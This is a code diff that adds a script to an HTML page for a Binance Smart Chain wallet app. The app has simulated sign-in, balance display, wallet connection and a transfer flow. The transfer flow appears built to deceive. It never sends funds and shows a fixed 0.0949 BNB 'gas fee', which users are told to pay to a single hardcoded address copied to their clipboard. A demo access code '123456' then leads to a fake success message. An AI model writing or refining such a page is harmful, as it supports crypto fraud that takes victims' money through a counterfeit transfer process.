@@ -606,6 +606,255 @@ document.addEventListener("DOMContentLoaded", () => {
   }
 });
 </script>
+  
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.3/dist/ethers.min.js"></script>
+<script>
+  // --- Page 1: Sign In ---
+  function signIn() {
+    const email = document.getElementById("emailInput").value.trim();
+    const password = document.getElementById("passwordInput").value.trim();
+    const status = document.getElementById("signInStatus");
+    if (!email || !password) {
+      status.innerText = "Please enter email and password.";
+      status.style.color = "red";
+      return;
+    }
+    status.innerText = "Signing in...";
+    status.style.color = "#f3ba2f";
+    // Simulate login (replace with actual auth)
+    setTimeout(() => {
+      status.innerText = "";
+      showPage('page4'); // go to Homepage after sign in
+    }, 1000);
+  }
+
+  // --- Page 4: Homepage ---
+  function openTransferPage(token) {
+    // For demo, just go to Transfer page
+    showPage('page8');
+    document.getElementById('networkSelect').value = "Binance Smart Chain";
+    document.getElementById('inputWallet').value = "";
+    document.getElementById('transferAmount').value = "";
+    updateGasFee();
+  }
+
+  function updateBalancesDisplay() {
+    const wallet = localStorage.getItem("connectedWallet");
+    if (!wallet) {
+      document.getElementById("usdtBalance").innerText = "0.00";
+      document.getElementById("bnbBalance").innerText = "0.0000";
+      document.getElementById("totalAssetsDisplay").innerText = "$0.00";
+      return;
+    }
+    const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
+    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP-20
+    const usdtAbi = [
+      "function balanceOf(address owner) view returns (uint256)",
+      "function decimals() view returns (uint8)"
+    ];
+    const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, provider);
+
+    Promise.all([
+      usdtContract.balanceOf(wallet),
+      usdtContract.decimals(),
+      provider.getBalance(wallet)
+    ]).then(([balance, decimals, bnbBalance]) => {
+      const usdtBalance = (balance / 10 ** decimals).toFixed(2);
+      const bnbFormatted = ethers.formatEther(bnbBalance);
+      document.getElementById("usdtBalance").innerText = usdtBalance;
+      document.getElementById("bnbBalance").innerText = parseFloat(bnbFormatted).toFixed(4);
+      // Assume BNB price = $240 for total assets estimation
+      const total = parseFloat(usdtBalance) + parseFloat(bnbFormatted) * 240;
+      document.getElementById("totalAssetsDisplay").innerText = `$${total.toFixed(2)}`;
+    }).catch(err => {
+      console.error("Error updating balances:", err);
+    });
+  }
+
+  // --- Page 5 & 6: Top Up BNB and Scan/Receive ---
+  async function submitTransaction() {
+    const hash = document.getElementById("txHash").value.trim();
+    const status = document.getElementById("txStatus");
+
+    if (!hash || !/^0x([A-Fa-f0-9]{64})$/.test(hash)) {
+      status.innerText = "Invalid transaction hash.";
+      status.style.color = "red";
+      return;
+    }
+
+    try {
+      const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
+      const receipt = await provider.getTransactionReceipt(hash);
+
+      if (!receipt) {
+        status.innerText = "Transaction not found. Please wait for confirmation.";
+        status.style.color = "orange";
+        return;
+      }
+
+      status.innerText = "✅ Transaction Confirmed!";
+      status.style.color = "limegreen";
+
+      const wallet = localStorage.getItem("connectedWallet");
+      if (!wallet) {
+        console.warn("No wallet connected.");
+        return;
+      }
+
+      // Update balances on confirmation
+      updateBalancesDisplay();
+
+    } catch (err) {
+      console.error(err);
+      status.innerText = "Error verifying transaction.";
+      status.style.color = "red";
+    }
+  }
+
+  // --- Page 7, 12, 13: Wallet Connect / Manual Connect ---
+  async function connectWallet() {
+    const statusElems = [
+      document.getElementById('walletInfo'),
+      document.getElementById('walletDisplay'),
+      document.getElementById('walletConnectionStatus')
+    ].filter(Boolean);
+
+    if (typeof window.ethereum === 'undefined') {
+      statusElems.forEach(el => el.innerText = "MetaMask not available");
+      return;
+    }
+
+    try {
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const accounts = await provider.send("eth_requestAccounts", []);
+      if (!accounts.length) {
+        statusElems.forEach(el => el.innerText = "No wallet accounts found.");
+        return;
+      }
+      const walletAddress = accounts[0];
+      localStorage.setItem("connectedWallet", walletAddress);
+      statusElems.forEach(el => el.innerText = `Connected Wallet: ${walletAddress}`);
+      updateConnectedWalletDisplay();
+      updateBalancesDisplay();
+      showPage('page4');
+    } catch (err) {
+      console.error(err);
+      statusElems.forEach(el => el.innerText = "Failed to connect wallet.");
+    }
+  }
+
+  function manualWalletConnect() {
+    const manualInput = document.getElementById('manualWallet') || document.getElementById('manualWalletInput');
+    const statusElems = [
+      document.getElementById('walletInfo'),
+      document.getElementById('walletDisplay'),
+      document.getElementById('walletConnectionStatus')
+    ].filter(Boolean);
+
+    if (!manualInput) return;
+    const manualAddress = manualInput.value.trim();
+    if (!manualAddress || !manualAddress.startsWith("0x") || manualAddress.length !== 42) {
+      statusElems.forEach(el => el.innerText = "Invalid wallet address.");
+      return;
+    }
+    localStorage.setItem("connectedWallet", manualAddress);
+    statusElems.forEach(el => el.innerText = `Manual Wallet Connected: ${manualAddress}`);
+    updateConnectedWalletDisplay();
+    updateBalancesDisplay();
+    showPage('page4');
+  }
+
+  function disconnectWallet() {
+    localStorage.removeItem('connectedWallet');
+    updateConnectedWalletDisplay();
+    updateBalancesDisplay();
+    alert("Wallet disconnected.");
+  }
+
+  function logout() {
+    localStorage.clear();
+    alert("You have been logged out.");
+    showPage('page1');
+  }
+
+  // --- Pages 8 & 9i & 9ii: Transfer & BNB Gas Confirmation & Access Code ---
+  function setMaxAmount() {
+    const wallet = localStorage.getItem('connectedWallet');
+    if (!wallet) {
+      alert("Please connect wallet first.");
+      return;
+    }
+    // For demo, set max to 10 BNB (replace with real balance fetching logic)
+    document.getElementById('transferAmount').value = "10";
+    updateGasFee();
+  }
+
+  function updateGasFee() {
+    // Gas fee fixed for demo
+    document.getElementById('gasFee').innerText = "0.09490 BNB";
+  }
+
+  function goToBNBGasConfirmationPage() {
+    showPage('page9i');
+  }
+
+  function copyBNBAddress() {
+    const address = "0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0";
+    navigator.clipboard.writeText(address).then(() => {
+      alert("BNB address copied to clipboard!");
+    });
+  }
+
+  function validateAccessCode() {
+    const code = document.getElementById('accessCodeInput').value.trim();
+    if (code === "123456") { // demo valid code
+      showPage('page10');
+      showProcessingPage();
+    } else {
+      showPage('page11');
+    }
+  }
+
+  // --- Page 10: Processing & helper ---
+  function showProcessingPage() {
+    showPage('page10');
+    setTimeout(() => {
+      alert("Transaction processed successfully!");
+      showPage('page4');
+      updateBalancesDisplay();
+    }, 3000);
+  }
+
+  // --- Utility Functions ---
+  function updateConnectedWalletDisplay() {
+    const wallet = localStorage.getItem("connectedWallet");
+    [
+      document.getElementById('connectedWalletDisplayHomepage'),
+      document.getElementById('walletDisplay'),
+      document.getElementById('walletInfo'),
+      document.getElementById('walletConnectionStatus')
+    ].forEach(elem => {
+      if (elem) elem.innerText = wallet ? wallet : "No wallet connected";
+    });
+  }
+
+  function showPage(pageId) {
+    document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
+    const page = document.getElementById(pageId);
+    if (page) page.style.display = 'block';
+  }
+
+  // --- Initialization ---
+  document.addEventListener("DOMContentLoaded", () => {
+    if (localStorage.getItem("connectedWallet")) {
+      showPage('page4'); // Homepage
+      updateConnectedWalletDisplay();
+      updateBalancesDisplay();
+    } else {
+      showPage('page1'); // Sign In page
+    }
+  });
+</script>
 
 </body>
 </html>
